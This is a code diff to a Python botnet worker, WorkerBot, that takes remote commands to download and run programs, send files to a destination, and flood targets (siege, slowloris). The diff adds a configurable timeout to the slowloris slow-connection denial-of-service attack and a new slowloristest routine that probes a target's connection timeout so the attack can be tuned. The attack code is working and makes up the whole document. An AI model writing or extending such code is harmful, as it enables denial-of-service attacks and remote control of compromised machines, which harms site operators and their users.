@@ -198,6 +198,11 @@ class Conn(object):
 
 
 class WorkerBot(BaseWorkerBot):
+    primary_payload = "GET /%s HTTP/1.1\r\n" +\
+        "Host: %s\r\n" +\
+        "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n" +\
+        "Content-Length: 42\r\n"
+    
     def get_task_patterns(self):
         return (
             ('download (?P<url>.*)', self.download),
@@ -207,7 +212,8 @@ class WorkerBot(BaseWorkerBot):
             ('run (?P<program>.*)', self.run),
             ('send_file (?P<filename>[^\s]+) (?P<destination>[^\s]+)', self.send_file),
             ('siege (?P<url>.*)', self.siege),
-            ('slowloris (?P<host>[^\s]+) (?P<num>\d+)(?: (?P<port>\d+))?', self.slowloris),
+            ('slowloris (?P<host>[^\s]+) (?P<num>\d+) (?P<timeout>\d+)(?: (?P<port>\d+))?', self.slowloris),
+            ('slowloristest (?P<host>[^\s]+)(?: (?P<port>\d+))?', self.slowloristest),
             ('status', self.status_report),
         )
     
@@ -306,8 +312,9 @@ class WorkerBot(BaseWorkerBot):
         
         return 'sent %s requests' % count
     
-    def slowloris(self, host, num, port=None):
+    def slowloris(self, host, num, timeout, port=None):
         port = port or 80
+        timeout = int(timeout)
         conns = [Conn(host, int(port), 5) for i in range(int(num))]
         failed = 0
         packets = 0
@@ -323,10 +330,7 @@ class WorkerBot(BaseWorkerBot):
                 
                 if conn.connected:
                     query = '?%d' % random.randint(1, 9999999999999)
-                    payload = "GET /%s HTTP/1.1\r\n" % query +\
-                        "Host: %s\r\n" % conn.host +\
-                        "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n" +\
-                        "Content-Length: 42\r\n";
+                    payload = self.primary_payload % (query, conn.host)
                     try:
                         conn.send(payload)
                         packets += 1
@@ -346,9 +350,46 @@ class WorkerBot(BaseWorkerBot):
                     except socket.error:
                         pass
 
-            gevent.sleep(60)
+            gevent.sleep(timeout)
             
         return "%s failed, %s packets sent" % (failed, packets)
+    
+    def slowloristest(self, host, port=None):
+        port = port or 80
+        times = [2, 30, 90, 240]
+        delay = 0
+        best = None
+        
+        try:
+            conn = Conn(host, int(port), 5)
+            conn.connect()
+        except:
+            return 'error connecting'
+        
+        query = '?%d' % random.randint(1, 9999999999999)
+        payload = self.primary_payload % (query, conn.host)
+        
+        try:
+            conn.send(payload)
+        except socket.error:
+            return 'error sending data'
+        
+        for interval in times:
+            gevent.sleep(interval)
+            
+            try:
+                conn.send('X-a: b\r\n')
+            except:
+                pass
+            else:
+                best = interval
+
+        try:
+            conn.send('Connection: Close\r\n\r\n')
+        except:
+            pass
+        
+        return 'use %d for timeout' % best
     
     def status_report(self):
         return self.task_queue.qsize()
